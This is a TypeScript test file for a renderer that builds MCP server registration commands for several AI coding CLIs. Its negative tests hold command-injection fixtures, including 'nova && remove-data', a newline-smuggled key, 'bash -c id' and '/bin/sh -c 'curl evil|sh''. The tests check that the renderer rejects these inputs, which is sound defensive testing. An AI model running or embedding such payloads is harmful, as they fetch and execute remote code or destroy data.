import { describe, expect, it } from "vitest";

import type { McpSetupPlan } from "../../../shared/api/mcpApps";
import { renderMcpSetupPlan } from "../mcpSetupRenderer";

describe("MCP setup renderer", () => {
  it("renders current Claude access-key artifacts without an app-id branch", () => {
    const rendered = renderMcpSetupPlan(
      plan("claude-code", "claude", {
        kind: "command",
        step: "register",
        executableId: "claude-executable",
        commandName: "claude",
        argv: [
          [{ literal: "mcp" }],
          [{ literal: "add" }],
          [{ literal: "--transport" }],
          [{ literal: "http" }],
          [{ literal: "dtxwiki" }],
          [{ slot: "mcp-url" }],
          [{ literal: "--header" }],
          [{ literal: "Authorization: Bearer " }, { slot: "access-token" }],
        ],
      }),
      { accessToken: "dtx_pat_one-time", locale: "en", shell: "bash" },
    );

    expect(rendered[0].value).toBe(
      "claude mcp add --transport http dtxwiki https://wiki.example/mcp --header 'Authorization: Bearer dtx_pat_one-time'",
    );
  });

  it("renders current Codex environment setup for PowerShell", () => {
    const rendered = renderMcpSetupPlan(
      plan("codex", "codex", {
        kind: "command",
        step: "register",
        executableId: "codex-executable",
        commandName: "codex",
        argv: [
          [{ literal: "mcp" }],
          [{ literal: "add" }],
          [{ literal: "dtxwiki" }],
          [{ literal: "--url" }],
          [{ slot: "mcp-url" }],
          [{ literal: "--bearer-token-env-var" }],
          [{ literal: "DTXWIKI_MCP_PAT" }],
        ],
        env: { DTXWIKI_MCP_PAT: [{ slot: "access-token-env" }] },
      }),
      { accessToken: "dtx_pat_one-time", locale: "en", shell: "powershell" },
    );

    expect(rendered[0].value).toBe(
      "$env:DTXWIKI_MCP_PAT = 'dtx_pat_one-time'\ncodex mcp add dtxwiki --url https://wiki.example/mcp --bearer-token-env-var DTXWIKI_MCP_PAT",
    );
  });

  it("renders Gemini HTTP registration with an environment-indirected header", () => {
    const rendered = renderMcpSetupPlan(
      plan("gemini-cli", "gemini", {
        kind: "command",
        step: "register",
        executableId: "gemini",
        commandName: "gemini",
        argv: [
          [{ literal: "mcp" }],
          [{ literal: "add" }],
          [{ literal: "--scope" }],
          [{ literal: "user" }],
          [{ literal: "--transport" }],
          [{ literal: "http" }],
          [{ literal: "--header" }],
          [{ literal: "Authorization: Bearer $DTXWIKI_MCP_PAT" }],
          [{ literal: "dtxwiki" }],
          [{ slot: "mcp-url" }],
        ],
        env: { DTXWIKI_MCP_PAT: [{ slot: "access-token-env" }] },
      }),
      { accessToken: "dtx_pat_one-time", locale: "en", shell: "powershell" },
    );

    expect(rendered[0].value).toBe(
      "$env:DTXWIKI_MCP_PAT = 'dtx_pat_one-time'\ngemini mcp add --scope user --transport http --header 'Authorization: Bearer $DTXWIKI_MCP_PAT' dtxwiki https://wiki.example/mcp",
    );
  });

  it("renders the native Antigravity OAuth registration command", () => {
    const oauthPlan: McpSetupPlan = {
      ...plan("antigravity", "agy", {
        kind: "command",
        step: "register",
        executableId: "agy",
        commandName: "agy",
        argv: [
          [{ literal: "mcp" }],
          [{ literal: "add" }],
          [{ literal: "--type" }],
          [{ literal: "http" }],
          [{ slot: "server-name" }],
          [{ slot: "mcp-url" }],
        ],
      }),
      auth: "oauth",
      variant_id: "antigravity-cli-oauth",
    };

    const rendered = renderMcpSetupPlan(oauthPlan, {
      accessToken: null,
      locale: "en",
      shell: "powershell",
    });

    expect(rendered[0].value).toBe(
      "agy mcp add --type http dtxwiki https://wiki.example/mcp",
    );
  });

  it("single-quotes and escapes a PowerShell access-key environment value", () => {
    const rendered = renderMcpSetupPlan(
      plan("codex", "codex", {
        kind: "command",
        step: "register",
        executableId: "codex-executable",
        commandName: "codex",
        argv: [[{ literal: "mcp" }]],
        env: { DTXWIKI_MCP_PAT: [{ slot: "access-token-env" }] },
      }),
      {
        accessToken: "dtxw_$env:USERNAME'key",
        locale: "en",
        shell: "powershell",
      },
    );

    expect(rendered[0].value).toBe(
      "$env:DTXWIKI_MCP_PAT = 'dtxw_$env:USERNAME''key'\ncodex mcp",
    );
  });

  it("fails closed instead of rendering an unsafe executable", () => {
    expect(() =>
      renderMcpSetupPlan(
        plan("nova", "nova", {
          kind: "command",
          step: "register",
          executableId: "nova-executable",
          commandName: "nova && remove-data",
          argv: [
            [{ literal: "Authorization: Bearer " }, { slot: "access-token" }],
          ],
        }),
        { accessToken: "dtx_pat_one-time", locale: "en", shell: "bash" },
      ),
    ).toThrow("Unsafe MCP setup executable");
  });

  it.each(["bash", "PowerShell.exe"])(
    "rechecks and rejects the shell interpreter %s",
    (commandName) => {
      expect(() =>
        renderMcpSetupPlan(
          plan("nova", "nova", {
            kind: "command",
            step: "register",
            executableId: "nova-executable",
            commandName,
            argv: [[{ literal: "mcp" }]],
            env: {
              DTXWIKI_MCP_PAT: [{ slot: "access-token-env" }],
            },
          }),
          { accessToken: "dtx_pat_one-time", locale: "en", shell: "bash" },
        ),
      ).toThrow("Shell interpreter is not an approved");
    },
  );

  it.each(["-c", "/c", "-Command", "--command"])(
    "rechecks and rejects command-string argument %s",
    (argument) => {
      expect(() =>
        renderMcpSetupPlan(
          plan("nova", "nova", {
            kind: "command",
            step: "register",
            executableId: "nova-executable",
            commandName: "nova",
            argv: [[{ literal: argument }]],
            env: {
              DTXWIKI_MCP_PAT: [{ slot: "access-token-env" }],
            },
          }),
          { accessToken: "dtx_pat_one-time", locale: "en", shell: "bash" },
        ),
      ).toThrow("command-string mode is not allowed");
    },
  );

  it.each([
    {
      name: "a bare argv secret",
      artifact: {
        kind: "command" as const,
        step: "register" as const,
        executableId: "nova-executable",
        commandName: "nova",
        argv: [[{ slot: "access-token" as const }]],
      },
    },
    {
      name: "the wrong environment secret atom",
      artifact: {
        kind: "command" as const,
        step: "register" as const,
        executableId: "nova-executable",
        commandName: "nova",
        argv: [[{ literal: "mcp" }]],
        env: { DTXWIKI_MCP_PAT: [{ slot: "access-token" as const }] },
      },
    },
  ])("rechecks and rejects $name in a tampered command plan", ({ artifact }) => {
    expect(() =>
      renderMcpSetupPlan(plan("nova", "nova", artifact), {
        accessToken: "dtx_pat_one-time",
        locale: "en",
        shell: "bash",
      }),
    ).toThrow("unapproved command sink");
  });

  it("rejects access keys containing command-injection control characters", () => {
    const artifact: McpSetupPlan["artifacts"][number] = {
      kind: "command",
      step: "register",
      executableId: "nova-executable",
      commandName: "nova",
      argv: [
        [{ literal: "Authorization: Bearer " }, { slot: "access-token" }],
      ],
    };
    expect(() =>
      renderMcpSetupPlan(plan("nova", "nova", artifact), {
        accessToken: "dtx_safe\nremove-data",
        locale: "en",
        shell: "bash",
      }),
    ).toThrow("unsafe control characters");
  });

  it("rechecks that an access-key plan has an approved credential sink", () => {
    const artifact: McpSetupPlan["artifacts"][number] = {
      kind: "command",
      step: "register",
      executableId: "nova-executable",
      commandName: "nova",
      argv: [[{ literal: "mcp" }]],
    };
    expect(() =>
      renderMcpSetupPlan(plan("nova", "nova", artifact), {
        accessToken: "dtx_pat_one-time",
        locale: "en",
        shell: "bash",
      }),
    ).toThrow("must include an approved credential sink");
  });

  it("rechecks that an OAuth plan contains no credential sink", () => {
    const oauthPlan: McpSetupPlan = {
      ...plan("nova", "nova", {
        kind: "command",
        step: "register",
        executableId: "nova-executable",
        commandName: "nova",
        argv: [
          [{ literal: "Authorization: Bearer " }, { slot: "access-token" }],
        ],
      }),
      auth: "oauth",
    };
    expect(() =>
      renderMcpSetupPlan(oauthPlan, {
        locale: "en",
        shell: "bash",
      }),
    ).toThrow("must not include a credential sink");
  });

  it("renders only the approved root bearerToken JSON sink", () => {
    const artifact: McpSetupPlan["artifacts"][number] = {
      kind: "json-config",
      step: "register",
      label: { en: "Client config", ko: "클라이언트 설정" },
      value: {
        url: { slot: "mcp-url" },
        bearerToken: { slot: "access-token" },
      },
    };
    const [rendered] = renderMcpSetupPlan(plan("generic", "unused", artifact), {
      accessToken: "dtx_pat_one-time",
      locale: "ko",
      shell: "bash",
    });

    expect(rendered.label).toBe("클라이언트 설정");
    expect(JSON.parse(rendered.value)).toEqual({
      url: "https://wiki.example/mcp",
      bearerToken: "dtx_pat_one-time",
    });
  });

  it("renders only the exact Antigravity Authorization bearer sink", () => {
    const artifact: McpSetupPlan["artifacts"][number] = {
      kind: "json-config",
      step: "register",
      label: {
        en: "Antigravity MCP server entry",
        ko: "Antigravity MCP server entry",
      },
      value: {
        serverUrl: { slot: "mcp-url" },
        headers: {
          Authorization: { slot: "authorization-bearer" },
        },
      },
    };
    const [rendered] = renderMcpSetupPlan(
      plan("antigravity", "unused", artifact),
      {
        accessToken: "dtx_pat_one-time",
        locale: "en",
        shell: "bash",
      },
    );

    expect(JSON.parse(rendered.value)).toEqual({
      serverUrl: "https://wiki.example/mcp",
      headers: { Authorization: "Bearer dtx_pat_one-time" },
    });
  });

  it.each([
    { url: { slot: "access-token" }, bearerToken: { slot: "access-token" } },
    { bearerToken: { slot: "access-token-env" } },
    { nested: { bearerToken: { slot: "access-token" } } },
    { bearerToken: { slot: "access-token", literal: "smuggled" } },
    {
      serverUrl: { slot: "mcp-url" },
      Authorization: { slot: "authorization-bearer" },
    },
    {
      serverUrl: { slot: "mcp-url" },
      headers: { "X-Authorization": { slot: "authorization-bearer" } },
    },
    {
      serverUrl: { slot: "mcp-url" },
      headers: { Authorization: { slot: "access-token" } },
    },
    { url: { slot: "future-slot" } },
  ])("rechecks and rejects a tampered JSON template %#", (value) => {
    const artifact = {
      kind: "json-config",
      step: "register",
      label: { en: "Config", ko: "설정" },
      value,
    } as McpSetupPlan["artifacts"][number];
    expect(() =>
      renderMcpSetupPlan(plan("generic", "unused", artifact), {
        accessToken: "dtx_pat_one-time",
        locale: "en",
        shell: "bash",
      }),
    ).toThrow();
  });

  it("localizes command and instruction labels", () => {
    const localizedPlan: McpSetupPlan = {
      ...plan("nova", "nova", {
        kind: "command",
        step: "register",
        executableId: "nova-executable",
        commandName: "nova",
        argv: [[{ literal: "mcp" }]],
      }),
      auth: "oauth",
      artifacts: [
        {
          kind: "command",
          step: "register",
          executableId: "nova-executable",
          commandName: "nova",
          argv: [[{ literal: "mcp" }]],
        },
        {
          kind: "instruction",
          step: "register",
          body: { en: "Follow the guide.", ko: "안내를 따르세요." },
        },
      ],
    };

    const rendered = renderMcpSetupPlan(localizedPlan, {
      locale: "ko",
      shell: "bash",
    });
    expect(rendered.map((artifact) => artifact.label)).toEqual([
      "등록 명령",
      "안내",
    ]);
    expect(rendered[1].value).toBe("안내를 따르세요.");
  });

  it.each([
    [
      "en",
      ["Instruction", "Register command 1", "Instruction", "Register command 2"],
    ],
    ["ko", ["안내", "등록 명령 1", "안내", "등록 명령 2"]],
  ] as const)(
    "numbers only executable commands in an interleaved %s recipe",
    (locale, expectedLabels) => {
      const command = (name: string): McpSetupPlan["artifacts"][number] => ({
        kind: "command",
        step: "register",
        executableId: `${name}-executable`,
        commandName: name,
        argv: [[{ literal: "mcp" }]],
      });
      const interleaved: McpSetupPlan = {
        ...plan("nova", "nova", command("nova")),
        auth: "oauth",
        artifacts: [
          {
            kind: "instruction",
            step: "register",
            body: { en: "First", ko: "첫째" },
          },
          command("nova"),
          {
            kind: "instruction",
            step: "register",
            body: { en: "Second", ko: "둘째" },
          },
          command("quasar"),
        ],
      };

      expect(
        renderMcpSetupPlan(interleaved, { locale, shell: "bash" }).map(
          (artifact) => artifact.label,
        ),
      ).toEqual(expectedLabels);
    },
  );

  it("labels the sign-in step as a login command and keeps it unquoted", () => {
    const oauthPlan: McpSetupPlan = {
      ...plan("nova", "nova", {
        kind: "command",
        step: "register",
        executableId: "nova-executable",
        commandName: "nova",
        argv: [[{ literal: "mcp" }]],
      }),
      auth: "oauth",
      artifacts: [
        {
          kind: "command",
          step: "register",
          executableId: "nova-executable",
          commandName: "nova",
          argv: [[{ literal: "mcp" }], [{ literal: "add" }], [{ slot: "mcp-url" }]],
        },
        {
          kind: "command",
          step: "authenticate",
          executableId: "nova-executable",
          commandName: "nova",
          argv: [[{ literal: "mcp" }], [{ literal: "login" }], [{ slot: "server-name" }]],
        },
        {
          kind: "app-command",
          step: "authenticate",
          value: [{ literal: "/mcp auth " }, { slot: "server-name" }],
        },
      ],
    };

    const rendered = renderMcpSetupPlan(oauthPlan, {
      locale: "en",
      shell: "bash",
    });

    expect(
      rendered.map((artifact) => [artifact.step, artifact.label, artifact.value]),
    ).toEqual([
      ["register", "Register command", "nova mcp add https://wiki.example/mcp"],
      ["authenticate", "Login command", "nova mcp login dtxwiki"],
      ["authenticate", "In-app login command", "/mcp auth dtxwiki"],
    ]);
    // The in-app command goes into the client prompt, so shell quoting would
    // corrupt the text the user has to type.
    expect(rendered[2]).toMatchObject({ kind: "app-command" });
    expect(rendered[1]).toMatchObject({ kind: "command" });
  });

  it("localizes the sign-in labels", () => {
    const rendered = renderMcpSetupPlan(
      {
        ...plan("nova", "nova", {
          kind: "app-command",
          step: "authenticate",
          value: [{ literal: "/mcp auth " }, { slot: "server-name" }],
        }),
        auth: "oauth",
      },
      { locale: "ko", shell: "bash" },
    );

    expect(rendered[0].label).toBe("앱 내 로그인 명령");
  });

  it("resolves the in-app login label through the settings translator", () => {
    const calls: Array<[string, { defaultValue: string }]> = [];
    const marker = "Translated in-app login label";
    const [rendered] = renderMcpSetupPlan(
      {
        ...plan("nova", "nova", {
          kind: "app-command",
          step: "authenticate",
          value: [{ literal: "/mcp auth " }, { slot: "server-name" }],
        }),
        auth: "oauth",
      },
      {
        locale: "en",
        shell: "bash",
        t: (key, options) => {
          calls.push([key, options]);
          return marker;
        },
      },
    );

    expect(calls).toContainEqual([
      "appHub.labelInAppLoginCommand",
      { defaultValue: "In-app login command" },
    ]);
    expect(rendered.label).toBe(marker);
  });

  it("keeps an unknown or missing step visible as registration", () => {
    const legacy = {
      ...plan("nova", "nova", {
        kind: "instruction",
        step: "register",
        body: { en: "Legacy server", ko: "구버전 서버" },
      }),
      auth: "oauth",
      artifacts: [
        { kind: "instruction", body: { en: "Legacy server", ko: "구버전 서버" } },
        {
          kind: "instruction",
          step: "verify",
          body: { en: "Future step", ko: "미래 단계" },
        },
      ],
    } as unknown as McpSetupPlan;

    expect(
      renderMcpSetupPlan(legacy, { locale: "en", shell: "bash" }).map(
        (artifact) => artifact.step,
      ),
    ).toEqual(["register", "register"]);
  });

  it("rejects an in-app command that is not a slash command", () => {
    const smuggled = {
      ...plan("nova", "nova", {
        kind: "app-command",
        step: "authenticate",
        value: [{ literal: "/mcp" }],
      }),
      auth: "oauth",
      artifacts: [
        { kind: "app-command", step: "authenticate", value: [{ literal: "bash -c id" }] },
      ],
    } as unknown as McpSetupPlan;

    expect(() =>
      renderMcpSetupPlan(smuggled, { locale: "en", shell: "bash" }),
    ).toThrow("slash command");
  });

  it("rejects an absolute shell path disguised as a slash command", () => {
    const smuggled = {
      ...plan("nova", "nova", {
        kind: "app-command",
        step: "authenticate",
        value: [{ literal: "/mcp" }],
      }),
      auth: "oauth",
      artifacts: [
        {
          kind: "app-command",
          step: "authenticate",
          value: [{ literal: "/bin/sh -c 'curl evil|sh'" }],
        },
      ],
    } as unknown as McpSetupPlan;

    expect(() =>
      renderMcpSetupPlan(smuggled, { locale: "en", shell: "bash" }),
    ).toThrow("slash command");
  });

  it("rejects an in-app command containing other control characters", () => {
    const smuggled = {
      ...plan("nova", "nova", {
        kind: "app-command",
        step: "authenticate",
        value: [{ literal: "/mcp" }],
      }),
      auth: "oauth",
      artifacts: [
        {
          kind: "app-command",
          step: "authenticate",
          value: [{ literal: "/mcp auth\tdtxwiki" }],
        },
      ],
    } as unknown as McpSetupPlan;

    expect(() =>
      renderMcpSetupPlan(smuggled, { locale: "en", shell: "bash" }),
    ).toThrow("control characters");
  });

  it("rejects an in-app command that spans more than one line", () => {
    const smuggled = {
      ...plan("nova", "nova", {
        kind: "app-command",
        step: "authenticate",
        value: [{ literal: "/mcp" }],
      }),
      auth: "oauth",
      artifacts: [
        {
          kind: "app-command",
          step: "authenticate",
          value: [{ literal: "/mcp auth\ninjected-second-line" }],
        },
      ],
    } as unknown as McpSetupPlan;

    expect(() =>
      renderMcpSetupPlan(smuggled, { locale: "en", shell: "bash" }),
    ).toThrow("single line");
  });

  it("rejects a credential slot inside an in-app command", () => {
    const smuggled = {
      ...plan("nova", "nova", {
        kind: "app-command",
        step: "authenticate",
        value: [{ literal: "/mcp" }],
      }),
      auth: "oauth",
      artifacts: [
        {
          kind: "app-command",
          step: "authenticate",
          value: [{ literal: "/mcp auth " }, { slot: "access-token" }],
        },
      ],
    } as unknown as McpSetupPlan;

    // The transport parser already rejects this shape, so this is the second
    // line of defence for any caller that hands the renderer a built plan.
    expect(() =>
      renderMcpSetupPlan(smuggled, { locale: "en", shell: "bash" }),
    ).toThrow("unapproved in-app command sink");
  });

  it("rejects a recipe version outside the closed v1 renderer", () => {
    const unsupported = {
      ...plan("nova", "nova", {
        kind: "command",
        step: "register",
        executableId: "nova-executable",
        commandName: "nova",
        argv: [],
      }),
      recipe_version: 2,
    } as McpSetupPlan;
    expect(() =>
      renderMcpSetupPlan(unsupported, {
        accessToken: "dtx_pat_one-time",
        locale: "en",
        shell: "bash",
      }),
    ).toThrow("Unsupported MCP setup recipe version: 2");
  });

  it("rejects an MCP URL with embedded control characters", () => {
    // WHATWG URL parsing strips tab/CR/LF before validating, so only a raw
    // check keeps the newline out of the rendered mcp-url slot value.
    const crafted = {
      ...plan("nova", "nova", {
        kind: "app-command",
        step: "authenticate",
        value: [{ literal: "/mcp auth " }, { slot: "server-name" }],
      }),
      auth: "oauth" as const,
      mcp_url: "https://wiki.example/\n/mcp",
    };
    expect(() =>
      renderMcpSetupPlan(crafted, { locale: "en", shell: "bash" }),
    ).toThrow("unsafe control characters");
  });
});

function plan(
  ownerId: string,
  commandName: string,
  artifact: McpSetupPlan["artifacts"][number],
): McpSetupPlan {
  return {
    catalog_revision: "test.1",
    owner_kind: "app",
    owner_id: ownerId,
    variant_id: `${ownerId}-key`,
    recipe_id: `${commandName}-r1`,
    recipe_version: 1,
    auth: "access-key",
    transport: "streamable-http",
    surface: "cli",
    default_scope_preset: "agent-draft",
    mcp_url: "https://wiki.example/mcp",
    artifacts: [artifact],
    verification_instruction: "Run one read.",
  };
}
